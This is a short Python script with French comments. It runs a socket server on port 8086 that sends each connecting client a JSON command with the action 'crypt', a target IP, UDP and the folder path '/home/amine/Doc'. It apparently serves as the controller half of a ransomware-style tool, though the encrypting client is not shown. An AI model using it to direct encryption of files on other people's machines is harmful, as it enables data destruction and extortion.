import socket
import os
import json


def stocker_action_parametres(action, parametres):
    # Créer un dictionnaire pour stocker l'action et les paramètres
    action_parametres = {'action': action, 'parametres': parametres}

    # Convertir le dictionnaire en chaîne JSON
    chaine_json = json.dumps(action_parametres)

    # Retourner la chaîne JSON
    return chaine_json

def recuperer_action_parametres(chaine_json):
    try:
        # Charger la chaîne JSON en tant que dictionnaire
        action_parametres = json.loads(chaine_json)

        # Extraire l'action et les paramètres du dictionnaire
        action = action_parametres['action']
        parametres = action_parametres['parametres']

        # Retourner l'action et les paramètres
        return action, parametres

    except json.JSONDecodeError as e:
        print(f"Erreur lors du décryptage JSON : {e}")
        return None, None

def lister_fichiers(dossier):
    try:
        # Liste tous les fichiers et répertoires dans le dossier spécifié
        fichiers = os.listdir(dossier)

        # Filtrer les dossiers uniquement (exclure les répertoires)
        dossiers = [d for d in fichiers if os.path.isdir(os.path.join(dossier, d))]
        # Filtrer les fichiers uniquement (exclure les répertoires)
        fichiers = [fichier for fichier in fichiers if os.path.isfile(os.path.join(dossier, fichier))]

        return dossiers

    except OSError as e:
        print(f"Erreur lors de la liste des fichiers dans {dossier}: {e}")
        return []

def server_connect_action(action, parametres, IP, PORT):
    #Gestion des sockets pour la connexion réseau
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print("------------Serveur en ecoute a l'adresse: ",IP, " et le port: ", PORT,"---------------------------")

    s.bind((IP, PORT))
    s.listen(100)

    while True:
        try:
            conn, client = s.accept()
            print("Demande de connexion du client ", client[0], "Sur le port: ",client[1], "Accepté !")
            
            # Récupérer l'IP et PORT ouvert partir de la chaîne JSON
            IPc,PORTc= recuperer_action_parametres(conn.recv(1024).decode("utf-8"))
            print("IPc: ", IPc, " PORTc: ", PORTc)

            # Stocker l'action et les paramètres sous forme de chaîne JSON
            chaine_stockee = stocker_action_parametres(action, parametres)
            print("Chaine stockée:", chaine_stockee)
            
            conn.send(chaine_stockee.encode())
            
            client_response = conn.recv(1024)
            print("Choice from client: ", client_response.decode("utf-8") )


            print("-------------------Fermeture de connection avec le client ",client[0],"----------------------------------------" )
            conn.close()
        except KeyboardInterrupt:
            break

        except :
            print("Erreur: Fatale")

    conn.close()

action = "crypt"
parametres = {'ip': '172.76.32.12', 'protocole': 'udp','path':'/home/amine/Doc'}
IP = "0.0.0.0"
PORT = 8086
server_connect_action(action, parametres, IP, PORT)